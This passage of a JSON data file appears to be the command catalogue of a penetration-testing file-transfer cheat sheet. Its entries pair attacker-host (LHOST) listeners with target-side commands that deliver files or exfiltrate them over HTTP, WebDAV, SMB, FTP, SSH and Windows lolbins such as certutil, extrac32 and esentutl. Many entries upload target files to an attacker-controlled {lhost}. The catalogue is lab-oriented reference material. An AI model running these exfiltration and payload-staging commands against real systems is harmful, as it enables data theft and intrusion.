        "text": "certutil -encode \"{remotefile}\" \"%TEMP%\\{file}.b64\""
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe --data-binary \"@%TEMP%\\{file}.b64\" \"http://{lhost}:{lport}/upload?file={file}.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr -d '\\r' < \"{lhostpath}/{file}.b64\" | sed '/^-----/d' | base64 -d > \"{lhostpath}/{file}\""
      }
    ]
  },
  {
    "id": "uploadserver-win",
    "title": "uploadserver",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "receiver": "uploadserver",
    "source": "02",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && uploadserver {lport}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe -F \"files=@{remotefile}\" \"http://{lhost}:{lport}/upload\""
      }
    ],
    "requires": [
      "uploadserver",
      "curl.exe"
    ],
    "note": {
      "en": "uploadserver strictly expects a multipart field named files.",
      "ru": "uploadserver строго ожидает multipart-поле с именем files."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "uploadserver",
    "family": "native",
    "priority": 10
  },
  {
    "id": "uploadserver-linux",
    "title": "uploadserver",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "receiver": "uploadserver",
    "source": "02",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && uploadserver {lport}"
    },
    "client": [
      {
        "shell": "bash",
        "text": "curl -F \"files=@{remotefile}\" \"http://{lhost}:{lport}/upload\""
      }
    ],
    "requires": [
      "uploadserver",
      "curl"
    ],
    "note": {
      "en": "uploadserver strictly expects a multipart field named files.",
      "ru": "uploadserver строго ожидает multipart-поле с именем files."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "uploadserver",
    "family": "native",
    "priority": 10
  },
  {
    "id": "nginx-upload-linux",
    "title": "nginx PUT (Linux)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nginx",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -T \"{remotefile}\" \"http://{lhost}:{lport}/SecretUploadDirectory/{file}\""
      }
    ],
    "requires": [
      "nginx",
      "curl"
    ],
    "note": {
      "en": "Uploads with HTTP PUT into /SecretUploadDirectory. The file lands under /var/www/uploads/SecretUploadDirectory on LHOST.",
      "ru": "Загружает через HTTP PUT в /SecretUploadDirectory. Файл окажется в /var/www/uploads/SecretUploadDirectory на LHOST."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "nginx-upload-ps",
    "title": "nginx PUT (PowerShell)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nginx",
    "family": "powershell",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "Invoke-RestMethod -Uri \"http://{lhost}:{lport}/SecretUploadDirectory/{file}\" -Method Put -InFile \"{remotefile}\""
      }
    ],
    "requires": [
      "nginx",
      "curl"
    ],
    "note": {
      "en": "Uploads with HTTP PUT into /SecretUploadDirectory. The file lands under /var/www/uploads/SecretUploadDirectory on LHOST.",
      "ru": "Загружает через HTTP PUT в /SecretUploadDirectory. Файл окажется в /var/www/uploads/SecretUploadDirectory на LHOST."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "nginx-upload-win",
    "title": "nginx PUT (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nginx",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -T \"{remotefile}\" \"http://{lhost}:{lport}/SecretUploadDirectory/{file}\""
      }
    ],
    "requires": [
      "nginx",
      "curl"
    ],
    "note": {
      "en": "Uploads with HTTP PUT into /SecretUploadDirectory. The file lands under /var/www/uploads/SecretUploadDirectory on LHOST.",
      "ru": "Загружает через HTTP PUT в /SecretUploadDirectory. Файл окажется в /var/www/uploads/SecretUploadDirectory на LHOST."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "updog-download-linux",
    "title": "updog download (Linux)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "updog",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -o \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "updog",
      "curl"
    ],
    "note": {
      "en": "updog serves and receives files over HTTP. Start it with --ssl or --password when the lab requires it.",
      "ru": "updog раздаёт и принимает файлы по HTTP. Если нужно, запускайте с --ssl или --password."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "updog-download-win",
    "title": "updog download (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "updog",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -o \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "updog",
      "curl"
    ],
    "note": {
      "en": "updog serves and receives files over HTTP. Start it with --ssl or --password when the lab requires it.",
      "ru": "updog раздаёт и принимает файлы по HTTP. Если нужно, запускайте с --ssl или --password."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "updog-upload-linux",
    "title": "updog upload (Linux)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "updog",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -X POST -F \"file=@{remotefile}\" -F \"path=.\" \"http://{lhost}:{lport}/upload\""
      }
    ],
    "requires": [
      "updog",
      "curl"
    ],
    "note": {
      "en": "updog serves and receives files over HTTP. Start it with --ssl or --password when the lab requires it.",
      "ru": "updog раздаёт и принимает файлы по HTTP. Если нужно, запускайте с --ssl или --password."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "updog-upload-win",
    "title": "updog upload (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "updog",
    "family": "native",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -X POST -F \"file=@{remotefile}\" -F \"path=.\" \"http://{lhost}:{lport}/upload\""
      }
    ],
    "requires": [
      "updog",
      "curl"
    ],
    "note": {
      "en": "updog serves and receives files over HTTP. Start it with --ssl or --password when the lab requires it.",
      "ru": "updog раздаёт и принимает файлы по HTTP. Если нужно, запускайте с --ssl или --password."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "webdav-download-win",
    "title": "WebDAV download (curl)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "04",
    "server": {
      "shell": "bash",
      "text": "/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port={lport} --root={lhostpath} --auth=anonymous"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe -o \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "wsgidav",
      "curl.exe"
    ],
    "note": {
      "en": "The target pulls the file from the LHOST WebDAV share.",
      "ru": "Цель скачивает файл с WebDAV-шары на LHOST."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "native",
    "priority": 10
  },
  {
    "id": "webdav-download-linux",
    "title": "WebDAV download (curl)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "04",
    "server": {
      "shell": "bash",
      "text": "/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port={lport} --root={lhostpath} --auth=anonymous"
    },
    "client": [
      {
        "shell": "bash",
        "text": "curl -o \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "wsgidav",
      "curl"
    ],
    "note": {
      "en": "The target pulls the file from the LHOST WebDAV share.",
      "ru": "Цель скачивает файл с WebDAV-шары на LHOST."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "native",
    "priority": 10
  },
  {
    "id": "webdav-webclient-download",
    "title": "WebDAV via WebClient (download)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "04",
    "server": {
      "shell": "bash",
      "text": "/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port={lport} --root={lhostpath} --auth=anonymous"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "copy \"\\\\{lhost}@{lport}\\DavWWWRoot\\{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "WebClient service",
      "wsgidav"
    ],
    "note": {
      "en": "Uses the Windows WebDAV redirector. Start the WebClient service and enable basic auth for HTTP.",
      "ru": "Использует WebDAV-редиректор Windows. Запустите службу WebClient и включите basic auth для HTTP."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "cmd",
    "priority": 10
  },
  {
    "id": "webdav-davfs2",
    "title": "WebDAV via davfs2 (download)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "04",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo mount -t davfs http://{lhost}:{lport}/ /mnt -o noexec"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cp \"/mnt/{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "davfs2",
      "wsgidav"
    ],
    "note": {
      "en": "Mounts the LHOST WebDAV share as a filesystem, then copies the file. wsgidav runs anonymously; if you use the rclone/dufs alternative with auth, add username=...,password=... to -o. Unmount /mnt afterwards.",
      "ru": "Монтирует WebDAV-шару LHOST как файловую систему, затем копирует файл. wsgidav работает анонимно; если используете альтернативу rclone/dufs с auth, добавьте username=...,password=... в -o. После этого размонтируйте /mnt."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "native",
    "priority": 30
  },
  {
    "id": "webdav-upload-win",
    "title": "WebDAV upload (curl)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "04",
    "server": {
      "shell": "bash",
      "text": "/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port={lport} --root={lhostpath} --auth=anonymous"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe -T \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "wsgidav",
      "curl.exe"
    ],
    "note": {
      "en": "A simple authenticated WebDAV receiver. The target uploads the file with PUT.",
      "ru": "Простой WebDAV-приёмник с аутентификацией. Цель загружает файл через PUT."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "native",
    "priority": 20
  },
  {
    "id": "webdav-upload-linux",
    "title": "WebDAV upload (curl)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "04",
    "server": {
      "shell": "bash",
      "text": "/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port={lport} --root={lhostpath} --auth=anonymous"
    },
    "client": [
      {
        "shell": "bash",
        "text": "curl -T \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "wsgidav",
      "curl"
    ],
    "note": {
      "en": "The Linux WebDAV client. The receiver stores the file under the requested name.",
      "ru": "Linux-клиент WebDAV. Приёмник сохраняет файл под запрошенным именем."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "native",
    "priority": 20
  },
  {
    "id": "webdav-webclient-upload",
    "title": "WebDAV via WebClient (upload)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "04",
    "server": {
      "shell": "bash",
      "text": "/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port={lport} --root={lhostpath} --auth=anonymous"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "copy \"{remotefile}\" \"\\\\{lhost}@{lport}\\DavWWWRoot\\{file}\""
      }
    ],
    "requires": [
      "WebClient service",
      "wsgidav"
    ],
    "note": {
      "en": "Uses the Windows WebDAV redirector. The target uploads the file into the mounted WebDAV share.",
      "ru": "Использует WebDAV-редиректор Windows. Цель загружает файл в WebDAV-шару."
    },
    "docs": "docs/en/04-webdav.md",
    "channel": "webdav",
    "family": "cmd",
    "priority": 20
  },
  {
    "id": "extrac32",
    "title": "extrac32 (UNC download)",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "09",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "extrac32 /Y /C \"\\\\{lhost}\\{share_name}\\{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "extrac32",
      "SMB"
    ],
    "note": {
      "en": "A built-in Windows extractor that can copy from a UNC path. Authenticate to the share first.",
      "ru": "Штатный Windows-экстрактор, умеет копировать с UNC-пути. Сначала аутентификация на шаре."
    },
    "docs": "docs/en/09-lolbins.md",
    "channel": "smb",
    "family": "cmd",
    "priority": 10
  },
  {
    "id": "smb",
    "title": "impacket SMB share (download)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "03",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "net use \\\\{lhost}\\{share_name} /user:{share_user} {share_pass}"
      },
      {
        "shell": "cmd",
        "text": "copy \"\\\\{lhost}\\{share_name}\\{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "impacket",
      "SMB"
    ],
    "note": {
      "en": "The extended core path. Authenticate first; adjust the share name and credentials to your lab.",
      "ru": "Расширенный основной путь. Сначала аутентификация; подставьте имя шары и учётные данные своей лаборатории."
    },
    "docs": "docs/en/03-smb.md",
    "channel": "smb",
    "family": "impacket",
    "priority": 10
  },
  {
    "id": "smb-mount-download",
    "title": "mount.cifs download",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "smb",
    "family": "mount",
    "priority": 10,
    "source": "03",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo mkdir -p /mnt/smb && sudo mount -t cifs //{lhost}/{share_name} /mnt/smb -o username={share_user},password={share_pass},vers=2.0,sec=ntlmssp,nounix"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo cp \"/mnt/smb/{file}\" \"{remotefile}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo umount /mnt/smb && sudo rmdir /mnt/smb"
      }
    ],
    "requires": [
      "cifs-utils",
      "impacket"
    ],
    "note": {
      "en": "Mounts the share as a normal directory, copies the file, then unmounts. vers=2.0 and sec=ntlmssp are required for impacket; if mount.cifs still returns error(5) EIO, fall back to smbclient get.",
      "ru": "Монтирует шару как обычный каталог, копирует файл и размонтирует. Для impacket нужны vers=2.0 и sec=ntlmssp; если mount.cifs всё равно даёт error(5) EIO, используйте smbclient get."
    },
    "docs": "docs/en/03-smb.md"
  },
  {
    "id": "smbclient-deliver",
    "title": "smbclient get",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "03",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": [
      {
        "shell": "bash",
        "text": "smbclient //{lhost}/{share_name} -U {share_user}%{share_pass} -c \"get {file} {remotefile}\""
      }
    ],
    "requires": [
      "smbclient",
      "impacket"
    ],
    "note": {
      "en": "The Linux SMB client path. Authenticate with the same share credentials.",
      "ru": "Путь через Linux SMB-клиент. Используйте те же учётные данные шары."
    },
    "docs": "docs/en/03-smb.md",
    "channel": "smb",
    "family": "native",
    "priority": 10
  },
  {
    "id": "smb-list",
    "title": "smbclient list shares",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "smb",
    "family": "diagnostics",
    "priority": 10,
    "source": "03",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": {
      "shell": "bash",
      "text": "smbclient -L //{lhost} -U {share_user}%{share_pass}"
    },
    "requires": [
      "smbclient",
      "impacket"
    ],
    "note": {
      "en": "Lists the shares exported by the impacket server. Use -N instead of -U for an anonymous share.",
      "ru": "Показывает шары, которые отдаёт impacket-сервер. Для анонимной шары используйте -N вместо -U."
    },
    "docs": "docs/en/03-smb.md"
  },
  {
    "id": "esentutl",
    "title": "esentutl (UNC download)",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "09",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "esentutl /y \"\\\\{lhost}\\{share_name}\\{file}\" /d \"{remotefile}\" /o"
      }
    ],
    "requires": [
      "esentutl",
      "SMB"
    ],
    "note": {
      "en": "Works on some Windows builds and shares; it can fail with JET_errDiskIO on others.",
      "ru": "Работает на части сборок Windows и шар; на других может падать с JET_errDiskIO."
    },
    "docs": "docs/en/09-lolbins.md",
    "channel": "smb",
    "family": "cmd",
    "priority": 20
  },
  {
    "id": "smb-diagnostics",
    "title": "SMB diagnostics",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "smb",
    "family": "diagnostics",
    "priority": 20,
    "source": "03",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -zv {lhost} 445"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "smbclient -L //{lhost} -N"
      }
    ],
    "requires": [
      "nc",
      "smbclient"
    ],
    "note": {
      "en": "Checks that 445/tcp is reachable and whether the share allows anonymous listing.",
      "ru": "Проверяет доступность 445/tcp и разрешает ли шара анонимный листинг."
    },
    "docs": "docs/en/03-smb.md"
  },
  {
    "id": "smb-mount-upload",
    "title": "mount.cifs upload",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "smb",
    "family": "mount",
    "priority": 10,
    "source": "03",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo mkdir -p /mnt/smb && sudo mount -t cifs //{lhost}/{share_name} /mnt/smb -o username={share_user},password={share_pass},vers=2.0,sec=ntlmssp,nounix"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo cp \"{remotefile}\" \"/mnt/smb/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo umount /mnt/smb && sudo rmdir /mnt/smb"
      }
    ],
    "requires": [
      "cifs-utils",
      "impacket"
    ],
    "note": {
      "en": "Mounts the attacker share and copies the file into it. vers=2.0 and sec=ntlmssp are required for impacket; if mount.cifs still returns error(5) EIO, use smbclient put.",
      "ru": "Монтирует шару атакующего и копирует туда файл. Для impacket нужны vers=2.0 и sec=ntlmssp; если mount.cifs всё равно даёт error(5) EIO, используйте smbclient put."
    },
    "docs": "docs/en/03-smb.md"
  },
  {
    "id": "smb-exfil",
    "title": "impacket SMB share (upload)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "03",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "net use \\\\{lhost}\\{share_name} /user:{share_user} {share_pass}"
      },
      {
        "shell": "cmd",
        "text": "copy \"{remotefile}\" \"\\\\{lhost}\\{share_name}\\{file}\""
      }
    ],
    "requires": [
      "impacket",
      "SMB"
    ],
    "note": {
      "en": "Authenticate first. The source file must be readable by the current user.",
      "ru": "Сначала аутентификация. Исходный файл должен быть доступен текущему пользователю."
    },
    "docs": "docs/en/03-smb.md",
    "channel": "smb",
    "family": "impacket",
    "priority": 20
  },
  {
    "id": "smbclient-exfil",
    "title": "smbclient put",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "03",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": [
      {
        "shell": "bash",
        "text": "smbclient //{lhost}/{share_name} -U {share_user}%{share_pass} -c \"put {remotefile} {file}\""
      }
    ],
    "requires": [
      "smbclient",
      "impacket"
    ],
    "note": {
      "en": "The file is uploaded to the attacker share and then appears in /tmp/share.",
      "ru": "Файл загружается в шару атакующего и появляется в /tmp/share."
    },
    "docs": "docs/en/03-smb.md",
    "channel": "smb",
    "family": "native",
    "priority": 20
  },
  {
    "id": "smb-tar-exfil",
    "title": "tar over smbclient",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "smb",
    "family": "native",
    "priority": 30,
    "source": "03",
    "server": {
      "shell": "bash",
      "text": "sudo impacket-smbserver {share_name} {lhostpath} -smb2support -username {share_user} -password {share_pass}"
    },
    "client": {
      "shell": "bash",
      "text": "tar czf - \"{remotefile}\" | smbclient //{lhost}/{share_name} -U {share_user}%{share_pass} -c \"put - {file}.tar.gz\""
    },
    "requires": [
      "smbclient",
      "tar",
      "impacket"
    ],
    "note": {
      "en": "Streams a tar archive straight into the share without writing an intermediate file on RHOST.",
      "ru": "Передаёт tar-архив сразу в шару, без промежуточного файла на RHOST."
    },
    "docs": "docs/en/03-smb.md"
  },
  {
    "id": "ftp-deliver-win",
    "title": "FTP download (curl, anonymous)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "05",
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe -s \"ftp://{lhost}:{lport}/{file}\" -o \"{remotefile}\""
      }
    ],
    "requires": [
      "pyftpdlib",
      "curl.exe"
    ],
    "note": {
      "en": "The server is anonymous and writable. For a stricter lab, start pyftpdlib with a username and password.",
      "ru": "Сервер анонимный и с записью. Для более строгой лаборатории запускайте pyftpdlib с логином и паролем."
    },
    "docs": "docs/en/05-ftp.md",
    "channel": "ftp",
    "family": "curl",
    "priority": 10
  },
  {
    "id": "ftp-deliver-linux",
    "title": "FTP download (curl, anonymous)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "05",
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": [
      {
        "shell": "bash",
        "text": "curl -s \"ftp://{lhost}:{lport}/{file}\" -o \"{remotefile}\""
      }
    ],
    "requires": [
      "pyftpdlib",
      "curl"
    ],
    "note": {
      "en": "The server is anonymous and writable. For a stricter lab, start pyftpdlib with a username and password.",
      "ru": "Сервер анонимный и с записью. Для более строгой лаборатории запускайте pyftpdlib с логином и паролем."
    },
    "docs": "docs/en/05-ftp.md",
    "channel": "ftp",
    "family": "curl",
    "priority": 10
  },
  {
    "id": "ftp-exfil-win",
    "title": "FTP upload (curl, anonymous)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "05",
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe -s -T \"{remotefile}\" \"ftp://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "pyftpdlib",
      "curl.exe"
    ],
    "note": {
      "en": "The writable anonymous share is lab-only. Use authenticated FTP when the test requires it.",
      "ru": "Анонимная шара с записью только для лаборатории. Если тест требует - используйте FTP с аутентификацией."
    },
    "docs": "docs/en/05-ftp.md",
    "channel": "ftp",
    "family": "curl",
    "priority": 20
  },
  {
    "id": "ftp-exfil-linux",
    "title": "FTP upload (curl, anonymous)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "05",
    "server": {
      "shell": "bash",
      "text": "python3 -m pyftpdlib --port {lport} --write --directory {lhostpath}"
    },
    "client": [
      {
        "shell": "bash",
        "text": "curl -s -T \"{remotefile}\" \"ftp://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "pyftpdlib",
      "curl"
    ],
    "note": {
      "en": "The writable anonymous share is lab-only. Use authenticated FTP when the test requires it.",
      "ru": "Анонимная шара с записью только для лаборатории. Если тест требует - используйте FTP с аутентификацией."
    },
    "docs": "docs/en/05-ftp.md",
    "channel": "ftp",
    "family": "curl",
    "priority": 20
  },
  {
    "id": "pscp-deliver",
    "title": "PSCP upload",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "cmd",
        "text": "pscp.exe -pw '{rhost_pass}' \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "PuTTY pscp.exe",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file with PuTTY pscp.exe. -pw exposes the password in the process list and shell history; prefer keys.",
      "ru": "Загружает файл через PuTTY pscp.exe. -pw оставляет пароль в списке процессов и истории; предпочитайте ключи."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "pscp",
    "priority": 10
  },
  {
    "id": "rsync-deliver",
    "title": "rsync upload",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "rsync -avz -e \"ssh -p {ssh_port}\" \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "rsync",
      "sshd"
    ],
    "note": {
      "en": "Synchronizes a local file to RHOST over SSH. Useful for large files and resumed transfers; set the SSH port in Advanced parameters.",
      "ru": "Синхронизирует локальный файл с RHOST по SSH. Удобно для больших файлов и докачки; SSH-порт задаётся в Advanced parameters."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "rsync",
    "priority": 10
  },
  {
    "id": "scp-deliver",
    "title": "SCP upload",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a local file to RHOST over SSH. Set RHOST and RHOST user in Advanced parameters; use a key or ssh-agent because scp will prompt for a password.",
      "ru": "Загружает локальный файл на RHOST по SSH. Укажите RHOST и пользователя RHOST в Advanced parameters; используйте ключ или ssh-agent, так как scp запросит пароль."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 10
  },
  {
    "id": "ssh-diagnostics",
    "title": "SSH diagnostics",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -zv {rhost} {ssh_port}"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ssh -p {ssh_port} {rhost_user}@{rhost} \"id\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ssh -vvv -p {ssh_port} {rhost_user}@{rhost}"
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Checks the SSH port, authentication, and verbose handshake. This is not a file-transfer command.",
      "ru": "Проверяет SSH-порт, аутентификацию и подробный handshake. Это не команда передачи файла."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "diagnostics",
    "priority": 10
  },
  {
    "id": "scp-deliver-dir",
    "title": "SCP upload (directory)",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -r \"{lhostpath}\" {rhost_user}@{rhost}:\"{remote}/\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Copies the LHOST path recursively to the RHOST path. Set both paths in Advanced parameters.",
      "ru": "Рекурсивно копирует путь LHOST на путь RHOST. Укажите оба пути в Advanced parameters."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 20
  },
  {
    "id": "tar-ssh-push",
    "title": "tar over SSH (push)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tar czf - \"{lhostpath}/{file}\" | ssh -p {ssh_port} {rhost_user}@{rhost} \"tar xzf - -C {remote}\""
      }
    ],
    "requires": [
      "ssh",
      "tar",
      "sshd"
    ],
    "note": {
      "en": "Streams a local directory to RHOST as a compressed tar archive without an intermediate file.",
